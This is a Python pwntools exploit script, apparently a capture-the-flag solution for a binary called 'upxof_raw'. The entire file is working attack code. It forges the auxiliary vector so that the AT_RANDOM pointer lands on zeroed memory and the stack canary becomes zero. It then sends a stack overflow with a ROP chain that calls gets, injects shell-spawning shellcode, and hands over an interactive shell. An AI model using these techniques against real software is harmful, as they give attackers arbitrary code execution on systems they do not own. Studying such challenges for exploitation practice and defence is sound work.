from pwn import *
context(os='linux', arch='amd64', log_level='debug') 
DEBUG = 1
GDB = 1
TEST = 0

class AtRandomChain:
    
    def __init__(self):
        self._chain = ""

    def chain_up(self, content):
        if type(content) == int:
            content = p64(content)
        self._chain += content

    def __str__(self):
        return self._chain
    
    def chain_up_zero(self, zero_len):
        self._chain += '\x00' * zero_len

    def chain_up_any_ptr(self):
        self.chain_up(0x600100)


if DEBUG:
    p = process("./upxof_raw")
else:
    p = remote()

def main():
    if GDB:
        raw_input()
    chain = AtRandomChain()
    chain.chain_up('12345678')
    chain.chain_up_zero(0x7b8 - 0x748)
    chain.chain_up(1)
    chain.chain_up_any_ptr()
    chain.chain_up(0x0)
    for i in range((0x888 - 0x7d8) / 8):
        chain.chain_up_any_ptr()
    chain.chain_up_any_ptr()
    chain.chain_up(0x0)
    chain.chain_up(0x21)
    chain.chain_up_any_ptr()
    chain.chain_up(0x10)
    #chain.chain_up_any_ptr()
    chain.chain_up(0x78bfbff)
    chain.chain_up(0x06)
    chain.chain_up(0x1000)
    chain.chain_up(0x11)
    chain.chain_up(0x64)
    chain.chain_up(0x3)
    chain.chain_up(0x400040)
    chain.chain_up(0x4)
    chain.chain_up(0x38)
    chain.chain_up(0x5)
    chain.chain_up(0x2)
    chain.chain_up(0x7)
    chain.chain_up(0x0)
    chain.chain_up(0x8)
    chain.chain_up(0x0)
    chain.chain_up(0x9)
    chain.chain_up(0x400988)
    chain.chain_up(0xb)
    chain.chain_up(0x3e8)
    chain.chain_up(0xc)
    chain.chain_up(0x3e8)
    chain.chain_up(0xd)
    chain.chain_up(0x3e8)
    chain.chain_up(0xe)
    chain.chain_up(0x3e8)
    chain.chain_up(0x17)
    chain.chain_up(0x0)
    chain.chain_up(0x19)
    # at_random ptr is here, since this address will
    # be zero, we know that at_random is zero
    chain.chain_up_any_ptr()
    chain.chain_up(0x1f)
    chain.chain_up_any_ptr()
    chain.chain_up(0xf)
    chain.chain_up_any_ptr()
    #chain.chain_up_zero(0x10)
    # orignal at_random is here, after the 0x10 zeros above
    # but since it's ptr has been changed, here means 
    # nothing to us.
    #chain.chain_up('\x12' * 8)
    p.recvuntil('password')
    if not TEST:
        p.sendline(str(chain))
    else:
        p.sendline('12345678' + 'a' * 0x70)
    p.recvuntil('go:')

    pop_rdi_ret = 0x4007f3

    payload = 'a' * 0x408
    payload += '\x00' * 8 # canary
    payload += p64(0x601108) # saved_rbp
    payload += p64(pop_rdi_ret) # new ip
    payload += p64(0x601000) # where we will write
    payload += p64(0x400763) # call gets

    #p.sendline('a' * 0x408 + '\x00' * 8 + '\xaa')
    p.sendline(payload)

    shellcode = asm(shellcraft.sh())
    #                                             
    p.sendline(shellcode.ljust(0x100, '\x00') + p64(0) + p64(0) + p64(0x601000))

    p.interactive()

if __name__ == "__main__":
    main()
